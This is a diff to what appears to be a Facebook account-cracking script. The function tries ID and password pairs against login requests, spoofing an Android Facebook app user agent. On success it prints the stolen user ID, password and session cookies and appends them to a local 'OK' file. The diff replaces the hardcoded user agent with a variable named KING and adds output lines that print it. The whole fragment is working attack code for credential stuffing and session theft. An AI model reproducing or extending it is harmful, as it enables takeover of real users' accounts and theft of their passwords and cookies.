@@ -323,7 +323,7 @@ def _M1_(ids,pasx):
                         'content-length': '1662',
                         'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
                         'sec-ch-ua-mobile': '?1',
-                        'user-agent': 'Mozilla/5.0 (Linux; Android 11; Pixel 4 Build/RQ1A.210205.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.212 Mobile Safari/537.36 [FBAN/FB4A;FBAV/288.0.0.72.119;FBBV/176964424;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/176964424;FBCR/]',
+                        'user-agent': KING,
                         'x-response-format': 'JSONStream',
                         'content-type': 'application/x-www-form-urlencoded',
                         'x-fb-lsd': 'AVrEIFcZUZg',
@@ -351,7 +351,9 @@ def _M1_(ids,pasx):
                                 uid = re.findall('c_user=(.*);xs', coki)[0]
                                 print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
                                 print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-                               ######৳ print(f'\033[38;5;196m─────────────────────────────────────────────────\033[1;37m')
+                                print(f'\033[38;5;196m─────────────────────────────────────────────────\033[1;37m')
+                                print(f"\r\033[38;5;196magent=[🤖]: {KING}\33[1;36m")
+                                print(f'\033[38;5;196m─────────────────────────────────────────────────\033[1;37m')
                                 open('/sdcard/ATOM-M1-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                                 ok.append(uid)
                                 break
